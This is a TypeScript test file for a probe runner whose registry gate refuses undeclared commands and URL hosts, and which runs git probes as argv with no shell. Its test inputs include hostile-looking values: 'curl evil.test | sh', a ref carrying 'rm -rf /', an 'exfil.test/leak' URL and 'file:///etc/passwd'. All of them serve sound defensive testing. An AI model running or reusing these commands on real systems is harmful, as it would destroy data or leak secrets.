import { expect, test } from "bun:test";
import {
  allProbesPassed,
  boundObserved,
  isProbeRefusal,
  runProbe,
  runProbes,
  type CommandOutcome,
  type CommandRequest,
  type DeclaredCommand,
  type Probe,
  type ProbeRegistry,
  type ProbeRunnerOptions,
} from "../src/index";

const AT = new Date("2026-08-04T09:00:00.000Z");
const REPO = "the-metafactory/soma";
const REGISTRY_PATH = "/home/.soma/policy/probe-registry.json";

/**
 * Every `command` and `url` probe in this file runs under a registry that
 * declares it — the gate is deny-by-default (DD-16 Amendment A), so a runner
 * test with no registry would be testing the refusal, not the runner.
 */
function registry(commands: DeclaredCommand[] = [], urlHosts: string[] = []): ProbeRegistry {
  return { status: "loaded", repo: REPO, path: REGISTRY_PATH, commands, urlHosts };
}

const ALL_DECLARED = registry(
  [
    { run: "bun test", cwd: "/repo" },
    { run: "sleep 999", cwd: "/repo" },
    { run: "first", cwd: "/repo" },
    { run: "second", cwd: "/repo" },
  ],
  ["example.test"],
);

function deps(
  overrides: {
    command?: (request: CommandRequest) => CommandOutcome;
    fetchStatus?: (target: string) => Promise<number>;
    pathExists?: (path: string) => boolean;
    registry?: ProbeRegistry;
  } = {},
): ProbeRunnerOptions {
  const calls: CommandRequest[] = [];
  return {
    cwd: "/repo",
    registry: overrides.registry ?? ALL_DECLARED,
    deps: {
      runCommand: async (request) => {
        calls.push(request);
        return overrides.command?.(request) ?? { exitCode: 0, stdout: "", stderr: "", timedOut: false };
      },
      ...(overrides.fetchStatus === undefined ? {} : { fetchStatus: overrides.fetchStatus }),
      ...(overrides.pathExists === undefined ? {} : { pathExists: overrides.pathExists }),
      now: () => AT,
    },
  };
}

function requireProbed(result: Awaited<ReturnType<typeof runProbe>>): {
  outcome: "pass" | "fail";
  observed: string;
  at: string;
} {
  if (result.state !== "probed") throw new Error("runner returned a specified result — it must always run the probe");
  return { outcome: result.outcome, observed: result.observed, at: result.at };
}

test("a command probe passes only on the declared exit code, and records exit + output tail", async () => {
  const probe: Probe = { type: "command", run: "bun test", timeoutSec: 600, expectExit: 0 };

  const pass = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: 0, stdout: "640 pass", stderr: "", timedOut: false }) })),
  );
  expect(pass.outcome).toBe("pass");
  expect(pass.observed).toContain("exit 0");
  expect(pass.observed).toContain("640 pass");
  expect(pass.at).toBe(AT.toISOString());

  const fail = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: 1, stdout: "", stderr: "2 fail", timedOut: false }) })),
  );
  expect(fail.outcome).toBe("fail");
  expect(fail.observed).toContain("expected exit 0");
});

test("timeout expiry is probe failure, never a pass and never a hang (§2.2)", async () => {
  const probe: Probe = { type: "command", run: "sleep 999", timeoutSec: 5, expectExit: 0 };
  const result = requireProbed(
    await runProbe(probe, deps({ command: () => ({ exitCode: null, stdout: "", stderr: "", timedOut: true }) })),
  );

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("timed out after 5s");
});

test("a runner error is a failed probe, not an exception — fail-closed", async () => {
  const probe: Probe = { type: "url", target: "https://example.test/health", expectStatus: 200 };
  const result = requireProbed(
    await runProbe(probe, {
      cwd: "/repo",
      registry: ALL_DECLARED,
      deps: {
        fetchStatus: async () => {
          throw new Error("ECONNREFUSED");
        },
        now: () => AT,
      },
    }),
  );

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("ECONNREFUSED");
});

test("a url probe compares the status it was told to expect", async () => {
  const probe: Probe = { type: "url", target: "https://example.test/", expectStatus: 204 };

  expect(requireProbed(await runProbe(probe, deps({ fetchStatus: async () => 204 }))).outcome).toBe("pass");
  const wrong = requireProbed(await runProbe(probe, deps({ fetchStatus: async () => 500 })));
  expect(wrong.outcome).toBe("fail");
  expect(wrong.observed).toContain("expected 204");
});

test("git probes run as argv, never through a shell — a ref name cannot inject", async () => {
  const seen: CommandRequest[] = [];
  const probe: Probe = { type: "git-ref-exists", ref: "feat/x; rm -rf /" };

  await runProbe(probe, {
    cwd: "/repo",
    deps: {
      runCommand: async (request) => {
        seen.push(request);
        return { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false };
      },
      now: () => AT,
    },
  });

  expect(seen).toHaveLength(1);
  expect(seen[0].shell).toBeUndefined();
  expect(seen[0].argv).toEqual(["git", "-C", "/repo", "rev-parse", "--verify", "--quiet", "feat/x; rm -rf /^{commit}"]);
});

test("git-ref-exists reports the resolved sha when it passes", async () => {
  const result = requireProbed(
    await runProbe(
      { type: "git-ref-exists", ref: "main" },
      deps({ command: () => ({ exitCode: 0, stdout: "deadbeef\n", stderr: "", timedOut: false }) }),
    ),
  );
  expect(result.outcome).toBe("pass");
  expect(result.observed).toContain("deadbeef");
});

test("git-merged-into fails when the ref is not an ancestor", async () => {
  const result = requireProbed(
    await runProbe(
      { type: "git-merged-into", ref: "feat/work-graph-primitive", into: "main" },
      deps({
        command: (request) =>
          request.argv?.includes("merge-base") === true
            ? { exitCode: 1, stdout: "", stderr: "", timedOut: false }
            : { exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false },
      }),
    ),
  );

  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("is not an ancestor of main");
});

test("artifact-exists checks the filesystem without atRef and the tree with it", async () => {
  const onDisk = requireProbed(
    await runProbe({ type: "artifact-exists", path: "src/work-graph.ts" }, deps({ pathExists: () => true })),
  );
  expect(onDisk.outcome).toBe("pass");

  const seen: CommandRequest[] = [];
  const atRef = requireProbed(
    await runProbe(
      { type: "artifact-exists", path: "src/work-graph.ts", atRef: "main" },
      {
        cwd: "/repo",
        deps: {
          runCommand: async (request) => {
            seen.push(request);
            return { exitCode: 1, stdout: "", stderr: "", timedOut: false };
          },
          now: () => AT,
        },
      },
    ),
  );
  expect(seen[0].argv).toEqual(["git", "-C", "/repo", "cat-file", "-e", "main:src/work-graph.ts"]);
  expect(atRef.outcome).toBe("fail");
});

test("runProbes runs every probe in order and allProbesPassed needs all of them", async () => {
  const order: string[] = [];
  const probes: Probe[] = [
    { type: "command", run: "first", timeoutSec: 10, expectExit: 0 },
    { type: "command", run: "second", timeoutSec: 10, expectExit: 0 },
  ];

  const results = await runProbes(
    probes,
    deps({
      command: (request) => {
        order.push(request.shell ?? "");
        return { exitCode: request.shell === "second" ? 3 : 0, stdout: "", stderr: "", timedOut: false };
      },
    }),
  );

  expect(order).toEqual(["first", "second"]);
  expect(results).toHaveLength(2);
  expect(allProbesPassed(results)).toBe(false);
  expect(allProbesPassed(results.slice(0, 1))).toBe(true);
});

test("a specified-but-unrun probe never counts as passed", () => {
  const probe: Probe = { type: "command", run: "bun test", timeoutSec: 10, expectExit: 0 };
  expect(allProbesPassed([{ probe, state: "specified" }])).toBe(false);
});

// ---------------------------------------------------------------------------
// The registry gate (DD-16 Amendment A, #526)
// ---------------------------------------------------------------------------

test("an undeclared command probe is refused, and the refusal is copy-pasteable", async () => {
  const ran: CommandRequest[] = [];
  const probe: Probe = { type: "command", run: "curl evil.test | sh", timeoutSec: 60, expectExit: 0 };

  const result = requireProbed(
    await runProbe(
      probe,
      deps({
        registry: registry([{ run: "bun test", cwd: "/repo" }]),
        command: (request) => {
          ran.push(request);
          return { exitCode: 0, stdout: "", stderr: "", timedOut: false };
        },
      }),
    ),
  );

  expect(result.outcome).toBe("fail");
  expect(ran).toHaveLength(0); // refused, not run
  expect(result.observed).toContain("refused by the probe registry");
  expect(result.observed).toContain("curl evil.test | sh");
  expect(result.observed).toContain("/repo");
  expect(result.observed).toContain(REGISTRY_PATH);
  expect(result.observed).toContain(`{"run": "curl evil.test | sh", "cwd": "/repo"}`);
});

test("cwd is part of the match — the same command in another directory is another command", async () => {
  const probe: Probe = { type: "command", run: "bun test", cwd: "../elsewhere", timeoutSec: 60, expectExit: 0 };
  const declared = registry([{ run: "bun test", cwd: "/repo" }]);

  const refused = requireProbed(await runProbe(probe, deps({ registry: declared })));
  expect(refused.outcome).toBe("fail");
  expect(refused.observed).toContain("/elsewhere");

  const allowed = requireProbed(
    await runProbe({ type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 }, deps({ registry: declared })),
  );
  expect(allowed.outcome).toBe("pass");
});

test("a url probe is refused unless its host is declared, and non-http targets never are", async () => {
  const declared = registry([], ["status.example.test"]);
  let fetched = 0;
  const fetchStatus = async (): Promise<number> => {
    fetched += 1;
    return 200;
  };

  const undeclaredHost = requireProbed(
    await runProbe({ type: "url", target: "https://exfil.test/leak", expectStatus: 200 }, deps({ registry: declared, fetchStatus })),
  );
  expect(undeclaredHost.outcome).toBe("fail");
  expect(undeclaredHost.observed).toContain("exfil.test");
  expect(undeclaredHost.observed).toContain("urlHosts");
  expect(fetched).toBe(0); // no request left the machine

  const localFile = requireProbed(
    await runProbe({ type: "url", target: "file:///etc/passwd", expectStatus: 200 }, deps({ registry: declared, fetchStatus })),
  );
  expect(localFile.outcome).toBe("fail");
  expect(localFile.observed).toContain("not an http(s) URL");
  expect(fetched).toBe(0);

  const declaredHost = requireProbed(
    await runProbe({ type: "url", target: "https://STATUS.example.test/health", expectStatus: 200 }, deps({ registry: declared, fetchStatus })),
  );
  expect(declaredHost.outcome).toBe("pass");
  expect(fetched).toBe(1);
});

test("a machine with no registry refuses command and url probes but still runs the argv ones", async () => {
  const absent: ProbeRegistry = { status: "absent", repo: REPO, path: REGISTRY_PATH };

  const command = requireProbed(
    await runProbe({ type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 }, deps({ registry: absent })),
  );
  expect(command.outcome).toBe("fail");
  expect(command.observed).toContain("no registry exists at");
  expect(command.observed).toContain(`"version": 1`); // the starter document to create

  const url = requireProbed(
    await runProbe({ type: "url", target: "https://example.test/", expectStatus: 200 }, deps({ registry: absent })),
  );
  expect(url.outcome).toBe("fail");

  const gitRef = requireProbed(
    await runProbe(
      { type: "git-ref-exists", ref: "main" },
      deps({ registry: absent, command: () => ({ exitCode: 0, stdout: "abc1234\n", stderr: "", timedOut: false }) }),
    ),
  );
  expect(gitRef.outcome).toBe("pass");

  const artifact = requireProbed(
    await runProbe({ type: "artifact-exists", path: "src/work-graph.ts" }, deps({ registry: absent, pathExists: () => true })),
  );
  expect(artifact.outcome).toBe("pass");
});

test("an unusable registry refuses rather than falling open", async () => {
  const invalid: ProbeRegistry = {
    status: "invalid",
    repo: REPO,
    path: REGISTRY_PATH,
    reason: "is not valid JSON: Unexpected token",
  };

  const result = requireProbed(
    await runProbe({ type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 }, deps({ registry: invalid })),
  );
  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("is unusable");
  expect(result.observed).toContain("not valid JSON");
});

test("the runner refuses gated probes when no registry is supplied at all", async () => {
  const result = requireProbed(
    await runProbe(
      { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 },
      { cwd: "/repo", deps: { now: () => AT } },
    ),
  );
  expect(result.outcome).toBe("fail");
  expect(result.observed).toContain("given no registry");
});

test("isProbeRefusal separates a gate refusal from a command that ran and failed", async () => {
  const refused = await runProbe(
    { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 },
    deps({ registry: registry() }),
  );
  const failed = await runProbe(
    { type: "command", run: "bun test", timeoutSec: 60, expectExit: 0 },
    deps({ command: () => ({ exitCode: 1, stdout: "", stderr: "boom", timedOut: false }) }),
  );

  expect(isProbeRefusal(refused)).toBe(true);
  expect(isProbeRefusal(failed)).toBe(false);
  expect(isProbeRefusal({ probe: refused.probe, state: "specified" })).toBe(false);
});

test("observed output keeps the tail, where the failure reason lives", () => {
  const long = `${"x".repeat(5_000)}THE-REASON`;
  const bounded = boundObserved(long, 20);
  expect(bounded).toContain("THE-REASON");
  expect(bounded.length).toBeLessThan(30);
});
